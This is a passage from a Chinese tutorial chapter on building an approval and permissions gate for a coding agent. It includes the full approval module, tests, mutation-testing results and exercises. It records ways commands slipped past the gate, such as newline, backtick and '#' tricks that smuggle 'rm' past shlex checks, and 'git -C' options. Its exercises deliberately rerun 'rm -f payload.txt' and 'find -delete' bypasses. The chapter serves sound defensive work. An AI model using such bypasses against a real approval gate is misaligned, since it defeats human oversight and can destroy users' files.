    assert out.startswith(PERMISSION_PREFIX)
    assert "Do not ask again" in out
    assert session.mode == "read-only"


async def test_F05_11_a_request_must_say_what_it_is_for() -> None:
    session = Session(mode="read-only", approver=AllowAll())
    out = await request_upgrade(session, needs="write-files", why="   ")
    assert out.startswith(PERMISSION_PREFIX)
    assert session.mode == "read-only"


async def test_F05_11_under_never_there_is_nobody_to_ask() -> None:
    """And saying so is better than a prompt that cannot appear."""
    session = Session(mode="read-only", policy="never", approver=AllowAll())
    out = await request_upgrade(session, needs="unrestricted", why="anything")
    assert "nobody to ask" in out
    assert session.mode == "read-only"


async def test_F05_11_asking_for_something_already_held_changes_nothing() -> None:
    session = Session(mode="full-access", approver=DenyAll())
    out = await request_upgrade(session, needs="write-files", why="whatever")
    assert "Already granted" in out
    assert session.mode == "full-access"


async def test_F05_11_the_tool_wrapper_needs_both_arguments(tmp_path: Path) -> None:
    ctx = ToolContext(root=tmp_path, shell=ShellSession(), session=Session(approver=AllowAll()))
    out = await request_permissions(ctx, {"needs": "write-files"})
    assert out.startswith(ERROR_PREFIX)


```

> - 申请了、被批准了，`apply_patch` 从"问"变成"放行"；被拒绝时回话以 `Permission denied:` 开头并说"别再问"，模式不变；
>   没写理由不行；`never` 下没人可问；已经有的权限，申请了什么也不变；工具包装函数缺参数时返回普通错误。

到这里 `approval.py` 已经分几次写完了。合起来对照一遍：

```python
"""The one door.

`policy.py` says what a command is.  `rules.py` says what has already been
agreed.  This module is where they meet a human, and -- more importantly --
it is the *only* place any of that happens.

That single-entry-point property is the abstraction this chapter pays for.
Chapter 0 listed the cases where a layer earns its keep and said the list
would grow when a new case turned up; this is one.  "Nothing executes
unapproved" is a rule, and a rule that is not enforced in one place is a rule
that every call site maintains separately.  `run_shell` and `apply_patch` both
need it today; every tool added after this chapter will need it too, and the
way to make that automatic is to leave no second route to the subprocess.

One of chapter 0's original cases applies as well: the command string is
model output, and this is where it crosses a trust boundary.
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass, field
from typing import Protocol

from minicodex.policy import (
    ApprovalPolicy,
    Decision,
    Risk,
    SandboxMode,
    judge_command,
    judge_write,
)
from minicodex.rules import RuleRefused, RuleStore, Scope, check_rule
from minicodex.shell_parse import segments
from minicodex.tool_errors import permission_error


@dataclass
class Session:
    """What this conversation is currently allowed to do.

    Mutable, and the only mutable thing in this module.  It has to be: the
    whole point of `request_permissions` is that the answer to "may I use the
    network" can be different at turn 9 than it was at turn 1.  Freezing it and
    rebuilding it would mean threading a new object back out through every
    tool handler, for no gain -- there is one of these per conversation and one
    conversation per process.

    `rules` and `approver` live here too rather than being passed alongside,
    because they have exactly the same lifetime and passing four things that
    always travel together is how you end up with a call site that forgets one.
    """

    mode: SandboxMode = "read-only"
    policy: ApprovalPolicy = "on-request"
    rules: RuleStore = field(default_factory=RuleStore)
    # Fails closed.  See `DenyAll`.
    approver: Approver = field(default_factory=lambda: DenyAll())

    def describe(self) -> str:
        return f"sandbox_mode={self.mode}, approval_policy={self.policy}"


@dataclass(frozen=True)
class ApprovalRequest:
    what: str
    reason: str
    risk: Risk
    # The prefix worth offering as a rule, or None when no rule may be made for
    # this command.  Computed before the prompt is drawn, so the prompt never
    # offers an option that would then be refused.
    suggested_rule: tuple[str, ...] | None


@dataclass(frozen=True)
class ApprovalReply:
    approved: bool
    # What the user actually agreed to run, which is not always what was asked.
    command: str
    remember: Scope | None = None


class Approver(Protocol):
    """Anything that can answer a yes/no about running something.

    A Protocol for the same reason `Model` is one: the tests need a
    deterministic implementation today, not hypothetically.  Structural typing
    means the test doubles below inherit nothing.
    """

    async def ask(self, request: ApprovalRequest) -> ApprovalReply: ...


@dataclass(frozen=True)
class GateResult:
    allowed: bool
    # The command to actually run.  Not the same string that came in when the
    # user edited it at the prompt.
    command: str
    # Set when the answer was no.  Written for the model, and deliberately not
    # shaped like an ordinary tool error -- see `tool_errors.permission_error`.
    denial: str | None = None
    # Set when the user changed the command.  Prepended to whatever the command
    # produced, because a model that is not told will report on the command it
    # asked for.
    note: str | None = None


def _looks_like_a_subcommand(word: str) -> bool:
    """`test`, `pr`, `run` yes.  `-q`, `tests/test_patch.py`, `--all` no.

    The distinction matters in both directions.  Including a flag makes the
    rule so specific that `pytest -x` asks again, which rebuilds the fatigue
    the rule existed to remove.  Including a path makes it specific to one
    file, with the same result.
    """
    return bool(word) and not word.startswith("-") and "/" not in word and "." not in word


def _suggested_rule(command: str) -> tuple[str, ...] | None:
    """The prefix worth remembering, or None if none is.

    The program plus up to two subcommand-shaped words after it.  This is the
    shape of codex's own examples -- `["cargo", "test"]`, `["gh", "pr", "check"]`,
    `["npm", "run", "dev"]` -- and it lands between the two ways of getting this
    wrong: `("cargo",)` is every subcommand cargo will ever have, and
    `("cargo", "test", "--all-features")` will not match the next invocation.
    """
    parts = segments(command)
    if parts is None or len(parts) != 1:
        # A multi-segment command is a composition, and a rule made from its
        # first words would silently cover whatever the user pipes into it
        # next time.
        return None

    words = [parts[0][0]]
    for word in parts[0][1:3]:
        if not _looks_like_a_subcommand(word):
            break
        words.append(word)

    try:
        check_rule(tuple(words))
    except RuleRefused:
        return None
    return tuple(words)


async def gate_command(command: str, session: Session) -> GateResult:
    verdict = judge_command(command, mode=session.mode, policy=session.policy)

    if verdict.decision is Decision.ALLOW:
        return GateResult(True, command)

    # Rules are consulted after the policy and before the human.  They can turn
    # a question into a yes; they can never turn a denial into a yes, because
    # `never` means there was nobody there to make the rule mean anything.
    parts = segments(command)
    if verdict.decision is Decision.ASK and parts is not None and session.rules.allows_every(parts):
        return GateResult(True, command)

    if verdict.decision is Decision.DENY:
        return GateResult(False, command, denial=_denial(command, verdict.reason, session))

    reply = await session.approver.ask(
        ApprovalRequest(
            what=command,
            reason=verdict.reason,
            risk=verdict.risk,
            suggested_rule=_suggested_rule(command),
        )
    )
    if not reply.approved:
        return GateResult(False, command, denial=_denial(command, "the user declined", session))

    if reply.remember is not None:
        # The rule is made from what the user *agreed to*, not from what the
        # model asked for.  Editing the command and choosing "always" otherwise
        # remembers the version that was rejected.
        remembered = _suggested_rule(reply.command)
        if remembered is not None:
            session.rules.remember(remembered, scope=reply.remember, prompted_by=reply.command)

    note = None
    if reply.command != command:
        note = (
            f"Note: the user changed your command before running it. "
            f"You asked for: {command!r}. What actually ran: {reply.command!r}. "
            "The output below is from the command that ran."
        )
    return GateResult(True, reply.command, note=note)


async def gate_write(describe: str, session: Session) -> GateResult:
    verdict = judge_write(mode=session.mode, policy=session.policy)
    if verdict.decision is Decision.ALLOW:
        return GateResult(True, describe)
    if verdict.decision is Decision.DENY:
        return GateResult(False, describe, denial=_denial(describe, verdict.reason, session))

    reply = await session.approver.ask(
        ApprovalRequest(
            what=describe, reason=verdict.reason, risk=verdict.risk, suggested_rule=None
        )
    )
    if not reply.approved:
        return GateResult(False, describe, denial=_denial(describe, "the user declined", session))
    return GateResult(True, describe)


# -- asking for more -------------------------------------------------------

# What `request_permissions` may be asked for, and what granting it means.
UPGRADES: dict[str, SandboxMode] = {
    "write-files": "workspace-write",
    "unrestricted": "full-access",
}


async def request_upgrade(session: Session, *, needs: str, why: str) -> str:
    """Raise the session's permissions, if a human says so.

    This exists because of the deadlock it prevents.  Without it, an agent that
    hits a wall has two options, and both are bad: keep retrying the thing that
    is refused, or stop and report failure on a task it could have finished.
    Neither is "ask", because until now there was nothing to ask with.

    `why` is required and is shown to the user verbatim.  A request with no
    stated reason is one the user can only answer by guessing.
    """
    if needs not in UPGRADES:
        return permission_error(
            f"there is no permission called {needs!r}",
            do_this=f"Ask for one of: {', '.join(sorted(UPGRADES))}.",
        )
    if not why.strip():
        return permission_error(
            "a permission request has to say what it is for",
            do_this='Send why="I need to run the test suite, which writes to .pytest_cache".',
        )

    target = UPGRADES[needs]
    if _rank(target) <= _rank(session.mode):
        return f"Already granted: {session.describe()}. Nothing changed; go ahead."

    if session.policy == "never":
        return permission_error(
            "there is nobody to ask in this session",
            do_this=(
                "Permissions cannot change here. Finish what you can within "
                f"{session.mode}, and say plainly in your final answer what you could not do."
            ),
        )

    reply = await session.approver.ask(
        ApprovalRequest(
            what=f"raise permissions to {target}",
            reason=f"the agent says: {why.strip()}",
            risk=Risk.UNKNOWN,
            suggested_rule=None,
        )
    )
    if not reply.approved:
        return permission_error(
            "the user did not grant that",
            do_this=(
                f"Do not ask again for the same thing. Work within {session.mode}, "
                "and if the task cannot be finished that way, say so and stop."
            ),
        )

    session.mode = target
    return f"Granted. Now: {session.describe()}."


def _rank(mode: SandboxMode) -> int:
    return ("read-only", "workspace-write", "full-access").index(mode)


# -- telling the model ------------------------------------------------------

_MODE_MEANING: dict[SandboxMode, str] = {
    "read-only": (
        "you can read files and run commands that only read. Editing files and "
        "running commands that change anything both need approval."
    ),
    "workspace-write": (
        "you can read files and edit files inside this repository with "
        "`apply_patch`. A *shell command* that changes anything still needs "
        "approval, because a shell command's paths cannot be checked in advance."
    ),
    "full-access": "nothing is restricted. Be careful; nobody is checking after you.",
}

_POLICY_MEANING: dict[ApprovalPolicy, str] = {
    # Does not name `request_permissions`, even to say it will not work: under
    # `never` the tool is still in the schema, and a sentence containing the
    # name is a sentence that can be read as an instruction to use it.
    "never": "there is nobody to ask. Anything the sandbox does not already allow is refused.",
    "on-request": "a human is here and will be asked about anything the sandbox does not allow.",
    "unless-trusted": (
        "a human is here and will be asked about everything except commands that only read."
    ),
}


def permissions_block(session: Session, *, can_request: bool = True) -> str:
    """Render the current permission state for the system prompt.

    Generated from the same constants the gate uses, never typed out twice.
    Chapter 3 found a defaulted number copied into a description and going
    stale; a permission state typed into a prompt by hand would drift from the
    gate the first time either one changed.  (It is still rendered once per
    run -- see `_instructions` in `__main__`.)

    `can_request` exists because the probe caught this block lying.  The first
    version ended "or call `request_permissions`" unconditionally.  Run against
    a real model with that tool deliberately absent, gemma4 called it anyway,
    2 samples out of 3 -- and in the real agent that lands on chapter 0's
    "no tool named 'request_permissions'" error, which is the message written
    for a model that *invented* a name.  It did not invent it; the prompt told
    it to.  A prompt that names a tool the model does not have is a prompt that
    spends a turn of the budget teaching it a lie.
    """
    from minicodex import permissions_prompt

    if session.policy == "never":
        what_to_do = (
            "Nothing can change that in this session, so do not ask. Work within "
            "the current permissions and say plainly what you could not do."
        )
    elif can_request:
        what_to_do = (
            "When you see one, either do the task another way, or call "
            "`request_permissions` with what you need and why."
        )
    else:
        what_to_do = "When you see one, do the task another way, or stop and explain."

    return permissions_prompt().format(
        mode=session.mode,
        mode_meaning=_MODE_MEANING[session.mode],
        policy=session.policy,
        policy_meaning=_POLICY_MEANING[session.policy],
        what_to_do=what_to_do,
    )


def _denial(what: str, reason: str, session: Session) -> str:
    """The message the model gets when the answer is no.

    The last sentence depends on the policy, and that dependency was measured
    rather than designed.  The first version always ended "or call
    request_permissions".  Under `never` there is nobody to grant anything, and
    gpt-4o-mini responded to the sentence by sending

        run_shell({"command": "request_permissions"})

    -- trying to run the tool as a shell command, because the message named it
    and nothing said where it lived.  Naming a capability is an instruction to
    use it, so it is only named when using it can work.  The same mistake in
    the same chapter, found the same way: see `permissions_block`.
    """
    if session.policy == "never":
        do_this = (
            "This is a permissions decision, not a failure of the command, and nothing "
            "in this session can change it -- running it again will be refused again. "
            "Do the task a way the current permissions allow, or stop and say plainly "
            "what you could not do."
        )
    else:
        do_this = (
            "This is a permissions decision, not a failure of the command -- running "
            "it again unchanged will be refused again. Either do the task a way the "
            "current permissions allow, or call the request_permissions tool to ask "
            "for what you need and say why."
        )
    return permission_error(f"that was not run, because {reason}", you_sent=what, do_this=do_this)


# -- implementations -------------------------------------------------------


class DenyAll:
    """The default, and the reason there is a default at all.

    An `Agent` constructed without an approver must not be an `Agent` that runs
    everything.  Failing closed makes a forgotten wire-up show up as a task
    that cannot act, which somebody notices, rather than as a sandbox that is
    not there, which nobody does.
    """

    async def ask(self, request: ApprovalRequest) -> ApprovalReply:
        return ApprovalReply(False, request.what)


class AllowAll:
    """For tests that are about something else, and for `--yes`."""

    async def ask(self, request: ApprovalRequest) -> ApprovalReply:
        return ApprovalReply(True, request.what)


class CliApprover:
    """Ask on the terminal.

    `input()` blocks, and a blocking call inside `async def` stalls the whole
    event loop -- the same rule chapter 1 hit with `Path.read_text()` and
    chapter 2 with `subprocess.Popen`.  Here it is arguably harmless, since
    there is nothing to do while a human decides, but ruff's ASYNC rules do not
    know that and neither will the next reader.  `to_thread` costs one line.
    """

    def __init__(self, *, stream_in=None, stream_out=None) -> None:
        self._in = stream_in
        self._out = stream_out

    async def ask(self, request: ApprovalRequest) -> ApprovalReply:
        return await asyncio.to_thread(self._ask_blocking, request)

    def _ask_blocking(self, request: ApprovalRequest) -> ApprovalReply:
        import sys

        out = self._out or sys.stdout
        read = self._in.readline if self._in is not None else sys.stdin.readline

        print(f"\n  the agent wants to run:\n    {request.what}", file=out)
        print(f"  {request.reason}", file=out)
        choices = ["[y] once", "[n] no", "[e] edit"]
        if request.suggested_rule is not None:
            prefix = " ".join(request.suggested_rule)
            choices[1:1] = [
                f"[s] always this session ({prefix})",
                f"[p] always in this project ({prefix})",
            ]
        print("  " + "  ".join(choices), file=out)
        out.flush()

        answer = (read() or "n").strip().lower()

        if answer == "e":
            print("  new command: ", file=out, end="")
            out.flush()
            edited = (read() or "").strip()
            # An empty edit is not an approval of the original.  Treating it as
            # one turns a slip of the return key into a yes.
            return ApprovalReply(bool(edited), edited or request.what)
        if answer == "s" and request.suggested_rule is not None:
            return ApprovalReply(True, request.what, remember="session")
        if answer == "p" and request.suggested_rule is not None:
            return ApprovalReply(True, request.what, remember="project")
        return ApprovalReply(answer == "y", request.what)
```

> 前面没单独讲的只有开头的 docstring（§12.1 的道理）和 import 行。

```bash
git add src/ tests/
git commit -m "feat: tell the model what it may do, and give it a way to ask for more"
```

> **这个提交把提示词和 `request_permissions` 放在一起**，因为 §17.4 说明这两件事分不开：提示词提到的工具必须存在。
> 拆成两个提交的话，中间那个状态是"提示词说有、实际没有"——一个实测过会出问题的状态。

---

## §19 逐条验证

### 19.1 全量

```
$ uv run pytest
205 passed, 8 skipped in 12.90s
```

```
$ uv run ruff check
All checks passed!
$ uv run ruff format --check
31 files already formatted
```

（Windows 上的结果。）8 个跳过：7 个是第 2 章 F02-10 的 Windows 缺口，第 8 个是 §10.1 那个符号链接测试。
**这一章没有让"跳过"变少，还多了一个。** 在 macOS/Linux 上它们会真正运行。

### 19.2 变异测试

第 4 章和插曲 A 用过的办法：**把这一章的某个决定撤销掉，看有没有测试变红。** 十六个决定，每次只撤一个，
在一份临时拷贝里做（不碰工作目录）。实测：

| 撤销的决定 | 变红的测试数 |
|---|---|
| 去掉字符允许名单 | 4 |
| 只判断第一段 | 6 |
| `git` 整体放行 | 4 |
| 忽略 git 的全局选项 | 1 |
| 解释器当普通命令 | 7 |
| 不认识的命令默认放行 | 5 |
| `workspace-write` 放行 shell 写操作 | 1 |
| 规则匹配任意一段就算数（`any` 而不是 `all`） | 1 |
| 规则可以任意宽 | 4 |
| 磁盘上的规则原样信任 | 1 |
| 改过的命令不告诉模型 | 2 |
| 拒绝消息长得像普通错误 | 2 |
| 默认 session 是宽松的 | 8 |
| 默认 approver 说"是" | 1 |
| 提示词永远提 `request_permissions` | 1 |
| 申请被拒时不说"别再问了" | 1 |

```
16/16 caught
tree green again: True   (205 passed, 8 skipped in 12.13s)
```

表里有六行是 **1**：这个决定只靠**唯一一个**测试守着。变异测试的产出不是"测试有效"这个结论，而是这张分布——
哪些决定有很多测试守着，哪些只有一个，哪些一个都没有。

### 19.3 这张表不是一开始就长这样

`FAULTS.md` 记下了这一章原始写作时变异测试的三次教训。它们解释了前面几个测试为什么是现在这个样子。

**一，第一次跑出来十六条"全绿"。** 如果是真的，意味着这一章的测试一个都没用。它不是真的——两个 bug 都在变异脚本里：

- 脚本靠在 pytest 输出里找 `N failed` 来数失败数，而当时的运行方式根本不打印这一行。找不到，就当成 0，判定"全绿"。
- 有一处变异用 `str.replace` 去删一段代码，没匹配上。`str.replace` 匹配不到时**不报错，原样返回**——变异从未发生，
  跑的是一份没改过的代码，当然全绿。

修法是两条规矩：**数 `FAILED` 开头的行；变异没有真的改动文件，就立刻报错退出。**

> **验证工具本身也需要被验证。** 这一章从头到尾在讲"检查器看到的比实际发生的少"。变异脚本是同一种故障的又一个实例：
> 它报告"没有失败"，而事实是"我没能看到失败"。

**二，"解释器当普通命令"活了下来。** 删掉 `classify` 里判断解释器的两行，测试全绿：命令落到 `UNKNOWN`，结论同样是"问"。
当时的测试只断言了结论。现在 `test_F05_04_no_interpreter_is_ever_auto_allowed` 断言的是**风险**——上表里那 7 个红就是它。

**三，"`workspace-write` 放行 shell 写"活了下来。** §11.2 花了半节论证这个决定，论证完了，**一个测试都没写**。
把那一行改回"自然"的写法，全绿。现在守着它的是 `test_F05_03_workspace_write_does_not_let_a_shell_command_write`——上表里唯一的那个红。

> 第 4 章说过：变异测试会告诉你哪些代码路径从来没被测过。这一章补一句：
> **它还会告诉你，你论证得最用力的地方，往往就是你忘了写测试的地方。** 因为写完论证的那一刻，人会觉得这件事已经办完了。

### 19.4 对照清单

| 编号 | 猜测 | 结果 |
|---|---|---|
| F05-01 | 分号绕过"看开头"的检查 | **成立**，而且旁边还有三个没猜到的（换行、反引号、`#`） |
| F05-02 | `git` 整体放行 | **成立**；还多出全局选项这一条 |
| F05-03 | `../../` 和符号链接 | **第 4 章已经挡住**，这一章只加了确认它的测试 |
| F05-04 | 解释器在只读模式下写文件 | **成立**；分词帮不上忙，只能按类别判断 |
| F05-05 | `curl`、`pip install` | **成立**；只识别，不阻止 |
| F05-06 | 审批疲劳 | **成立**（一个小任务问 2～4 次） |
| F05-07 | 规则太宽、查不到来源 | **动工前就挡住了**：规则带来源、能撤销、太宽的不让创建 |
| F05-08 | 改了命令，模型不知道 | **动工前就挡住了**：改动作为说明贴进输出 |
| F05-09 | 权限拒绝被当成普通错误重试 | **成立**（12/12）；改措辞**没用**，给一个工具有用 |
| F05-10 | 模型不知道自己的权限 | gemma4 上**成立**，gpt-4o-mini 上**不成立** |
| F05-11 | 没路可走，任务卡死 | **成立**（0/7 申请过）；加工具后 6/6 改道 |

---

## §20 收工

### 20.1 这一章的文件

| 文件 | 状态 | 在哪一节 |
|---|---|---|
| `src/minicodex/shell_parse.py` | 新增 | §7.3 |
| `src/minicodex/policy.py` | 新增 | §11.3 |
| `src/minicodex/rules.py` | 新增 | §14.1 |
| `src/minicodex/approval.py` | 新增 | §12.3 起，全文在 §18.4 |
| `src/minicodex/prompts/permissions.md` | 新增 | §17.1 |
| `src/minicodex/tools.py` | 改动 | §12.4、§18.3 |
| `src/minicodex/tool_errors.py` | 改动 | §16.3 |
| `src/minicodex/shell.py` | 改动（删除） | §12.2 |
| `src/minicodex/agent.py` | 改动 | §17.3 |
| `src/minicodex/__init__.py` | 改动 | §17.1 |
| `src/minicodex/__main__.py` | 改动 | §14.3、§17.7 |
| `tests/test_approval.py` | 新增 | §11.4、§12.4、§14.4、§15.3、§16.3、§17.7、§18.4 |
| `tests/test_characterization.py`、`tests/test_shell.py` | 改动 | §13.1 |
| `tests/test_schemas.py`、`tests/fixtures/tool_schemas.json` | 改动 | §18.3 |

### 20.2 提交、推送、PR

这一章边做边提交了五次：

```
feat: judge shell commands by segment, not by prefix
feat: one gate in front of run_shell and apply_patch
feat: remember approvals, with a scope, a source and a way to revoke
feat: an edited command is the one that runs, and the model is told
feat: tell the model what it may do, and give it a way to ask for more
```

```bash
git push -u origin feat/approval
```

PR 描述里要写的，除了"做了什么、为什么"，还有一段**"没做什么"**：

> 没有操作系统级的沙箱。`workspace-write` 对 shell 命令**不**放行写操作，理由在 `policy.py` 的注释里；
> 这是一个已知的缺口，不是遗漏。权限提示只在对话开始时渲染一次，见 `FAULTS.md`。

### 20.3 自己审一遍

**1 · 安全相关的代码，审查标准高在哪里？**

高在**默认值和出错的路径**，不在正常的路径。正常路径写错了会有人报 bug；默认值写错了没有人会发现。四个问题：
① 每个默认值是不是"拒绝"（`Session()` 是 `read-only` + `DenyAll`）；② 每条出错的路径是不是"拒绝"
（`ValueError` → `None` → 问；坏 JSON → 空规则库）；③ 每个"不认识"是不是"拒绝"（`_MODELLED`、`UNKNOWN`、不认识的 git 选项）；
④ 有没有第二条路（`shell.run_shell` 删了，并且有测试）。**四个问题问的都是"什么都没发生的时候会怎样"。**

**2 · `_MODELLED` 太保守，`grep 'foo.*bar' src/` 也要问，很烦。**

对，这是真的代价。接受它，因为错的方向不对称：多问一次是烦，少问一次是文件没了。而且这个代价可以慢慢还——
往 `_MODELLED` 里每加一个字符，都要先回答"bash 怎么理解它，`shlex` 同不同意"。加 `*` 之前得先分清 `rm *` 和 `grep '*'`，
那需要知道引号的状态，也就是需要一个真正的解析器。**在有它之前，这个"烦"是诚实的。**

**3 · `workspace-write` 对两个工具的行为不一样，不别扭吗？**

别扭。不别扭的写法会自动放行 `rm -rf /`（§11.2 实测过）。**两个工具的可控程度本来就不一样**：`apply_patch` 的路径从头到尾在我们手里，
shell 命令的路径在执行之前只是一个字符串。让接口对称、让行为撒谎，是把复杂度从代码转移到了用户的错误预期上。

**4 · `forget(index)` 用位置当编号，规则列表一变，编号就变了。**

是真问题：`minicodex rules` 和 `minicodex forget` 之间如果有别的进程加了规则，编号就错位。**没修**——现在只有一个写入者，
而给规则发固定的 ID 意味着一个真正的存储格式。记在这里。

**5 · 既然 §16 的结论是"改措辞没用"，为什么还留着 `Permission denied:`？**

因为它有另一个价值，而且和"修好了故障"是分开记的：它让读记录的人一眼分清两种失败，也让提示词有东西可指。
`FAULTS.md` 里 F05-09 的解法写的是 `request_permissions`，不是措辞。

---

## §21 codex 是怎么做的

- **分段规则一样，而且它写给模型看**（§4 引过原文）。我们只在代码里实现了，**没有告诉模型**——这是一个差距，
  后果是模型会写出自己觉得没问题的复合命令，然后被拦下来。
- **"看不懂就不参与规则匹配"一样**（§7.1）。codex 有 tree-sitter-bash 这个真正的解析器，用的同样是允许名单：
  语法树里出现不在名单上的节点类型，直接拒绝。
- **git 按子命令判断，一样，而且它更细**：除了 git，它还为 `find`、`rg`、`sed` 等各写了一段专门的逻辑（比如 `find` 排除 `-exec`、`-delete`）。
  我们的 `READ_ONLY` 里干脆没有这几个命令。codex 选择表达"大部分时候只读"，代价是每个命令一段专属代码。
- **解释器一律危险，一样**（§9）。
- **权限状态写进提示词，一样**：模板加占位符。
- **`request_permissions` 一样**，codex 还多一档我们没做的：不是整体提升权限，而是**只为这一条命令**追加某个可写路径或网络访问。
  这比我们的两档细，代价是需要一个能按路径执行的沙箱。
- **沙箱本身，我们没做。** codex 有 macOS、Linux、Windows 各自的实现，外加一个做网络策略的代理模块。这就是 §11.2 那个缺口的全貌。
- 有一点我们反而省事：codex 的沙箱在命令**执行中**拦截，事后要靠退出码和输出里的关键词去**猜**"这次失败是不是沙箱造成的"，
  它的源码注释承认这做不到完全确定。**我们的拒绝发生在执行之前，不用猜。** 这是"在策略层拦"相对"在操作系统层拦"唯一的优势——
  操作系统拦得更牢，但它拦下来的时候，命令已经跑了一半。

---

## §22 回头看：这一章撞到了什么

**预测到了，并且成立的：**

| 故障 | 挡住它的东西 |
|---|---|
| F05-01 分号绕过看开头的检查 | 分词后分段，每段单独判断 |
| F05-02 `git` 整体放行 | 按子命令判断；远程类归为 NETWORK |
| F05-04 解释器 | 一律 INTERPRETER，不靠解析 |
| F05-05 网络 | 归为 NETWORK，只识别不阻止 |
| F05-06 审批疲劳 | 可以记住的规则，带作用域、来源、撤销 |
| F05-09 权限拒绝被当成普通错误 | 改措辞**无效**；`request_permissions` 有效 |
| F05-10 模型不知道权限（只在 gemma4 上） | 权限状态写进系统消息 |
| F05-11 没路可走 | `request_permissions` |

**预测到了，动工前就挡住的：** F05-07（规则太宽）、F05-08（改了命令模型不知道）。
**预测到了，其实早就修好的：** F05-03（第 4 章的 `paths.resolve()`）。

**没预测到的：**

| 故障 | 怎么发现的 | 挡住它的东西 |
|---|---|---|
| **换行被 `shlex` 当成空白，bash 当成分隔符** | 🟡 静默（真的删了文件） | 字符允许名单 |
| **反引号粘进词里** | 🟡 静默（真的删了文件） | 同上 |
| **词中间的 `#` 让后半行消失** | 🟡 静默（真的删了文件） | 同上 |
| 没闭合的引号让 `shlex` 抛异常 | 🟢 边界测试 | `ValueError` → `None` → 问 |
| `;;` 的分支写了但从未执行 | ⚪ 写断言时发现 | `set(token) <= _PUNCTUATION` |
| `git -C`、`git -c` 绕过子命令检查 | 🟣 对照 codex | 检查全局选项 |
| **`workspace-write` 自动放行 `rm -rf /`** | 🟢 跑矩阵时发现 | shell 和 `apply_patch` 分开判断；缺口写明 |
| `shell.run_shell` 是一条不过门的近路 | 🟣 审查 | 删掉，并有测试保证它不回来 |
| 默认 `Session` 让插曲 A 的快照红了 | 🟠 跑全量时 | 不是 bug：改参数不改快照，新行为单独立测试 |
| 第一版规则检查拒绝了 `pytest` | 🟡 跑测试时 | 按"风险是否取决于下一个词"判断 |
| 规则太窄，换个选项又要问 | 🟣 设计时 | 提议"程序名 + 像子命令的词" |
| 空编辑、输入关闭被当成同意 | 🟢 边界测试 | `bool(edited)`、`== "y"` |
| "原样重复"的计数看不见"同目标重试" | 🟠 看记录时 | 换指标 |
| **提示词提到了不存在的工具，模型真去调用** | 🔵 真模型 | `can_request` |
| **拒绝消息提到了工具，模型当 shell 命令执行** | 🔵 真模型 | `never` 下不提 |
| **变异脚本报全绿，因为它数错了** | ⚪ 结果不可信才去查 | 数 `FAILED` 行；变异没生效就报错 |
| `workspace-write` 那个决定没有测试 | ⚪ 变异测试 | 补测试 |
| 删掉解释器分类后测试全绿 | ⚪ 变异测试 | 断言风险，不只断言结论 |
| 权限提示只渲染一次，申请成功后不更新 | 🟣 改写本章时 | **没修**，如实记录 |

标记：🔴 崩溃 · 🟡 静默 · 🟢 边界测试 · 🔵 长跑 · 🟠 看日志 · 🟣 审查 · ⚫ 用户报告 · ⚪ 工具/类型

**这一章没有一条是崩溃。** 而没预测到的那一大半里，反复出现的是同一个句式：

- `shlex` 看到 `['echo', 'a']`，bash 执行了 `rm`
- 计数器看到 0 次重复，模型把同一件事试了四遍
- 变异脚本看到"没有失败"，因为它没能看到失败
- 测试全绿，因为没有一个测试在测那个决定

> **"我没看到问题"和"没有问题"，是两句完全不同的话。**
> 一个专门用来"检查别的东西"的模块，最容易犯的错就是**以为自己检查过了**。

---

## 如果你只记住三件事

1. **不认识的东西，默认是"有问题"，不是"没问题"。**
   `_MODELLED` 是允许名单；`UNKNOWN` 落在"问"而不是"放行"；坏掉的规则文件得到空的规则库；忘了传 `Session` 拿到的是 `DenyAll`。
   **这四个决定长得不像，是同一个决定。** 拒绝名单的上限，是写它的人的想象力。

2. **让模型停止做无用功的，是给它一件别的事做，不是把"别做"说得更清楚。**
   实测：改拒绝的措辞，12 次里 12 次照样重试；给一个 `request_permissions` 工具，6 次里 6 次下一轮就改道。
   每次想在提示词里写"请不要……"之前，先问一句：它不这么做的话，还能做什么？

3. **做不到的事，要说出自己的名字，不要让配置项替你撒谎。**
   `workspace-write` 对 shell 命令不放行写操作，因为没有操作系统沙箱就没法保证"只写在工作区里"。
   用户是在文件没了之后，才会发现自己的预期是错的。

---

## 动手练习

1. 把 `shell_parse.py` 里检查 `_MODELLED` 的那两行删掉，跑测试，数有几个红（应该是 4 个）。
   然后照 §5 的办法，在一个临时目录里建一个 `payload.txt`，用真的 bash 执行 `ls` 换行 `rm -f payload.txt`，看着它消失。
   **再想想你自己的项目里，有多少个"检查函数"是这个层次的检查。**

2. 往 `READ_ONLY` 里加一个 `find`。钉死策略表的测试会红——这是设计意图。现在把期望表也改了，让测试全绿，
   然后想办法让 Agent 在 `read-only` 模式下删掉一个文件。（提示：`find . -name x -delete`。）
   **做完再回头看 §11.4 里那句"加进去之后 `find -delete` 就自动放行了"。**

3. 把 `allows_every` 里的 `all` 改成 `any`，跑测试。只有一个测试会红。找到它，
   然后对照 §19.2 的表，数一数还有哪些决定只靠一个测试守着。

4. 修掉 §17.6 那个缺口：让权限段在 `request_permissions` 成功之后更新。先别写代码，先列出哪些测试和快照会因此变红、
   每一个该"改参数"还是"改快照"（§13.1）。**列完你就知道为什么这一章没有顺手修它。**

下一章讲上下文压缩：会话变长之后，历史装不下了——而删错一条消息，服务端会直接拒绝整个请求。
